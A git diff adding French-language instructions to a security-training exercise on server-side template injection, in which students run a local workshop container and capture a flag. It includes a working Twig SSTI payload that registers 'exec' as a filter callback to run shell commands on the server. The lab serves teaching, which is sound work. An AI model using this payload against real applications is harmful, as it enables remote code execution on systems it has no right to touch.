@@ -139,5 +139,9 @@ Notez l'url saisie dans votre compte rendu ainsi que les étapes pour l'obtenir.
 ---
 ### Exercice n°1 SSTI
 
+pour commencer vous devrez pull le repot git : https://github.com/GoSecure/template-injection-workshop
+une fois cela fait un docker-compose up 
+ensuite lancer Vdn et enfin faite un links 127.0.0.1:8012
+une fois cela fait votre mission consite à récupérer le flag en utilisant une template injection.
 
-
+la commande suivante vous sera utile dans votre recherche du flag: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("echo -E `ls /`")}}
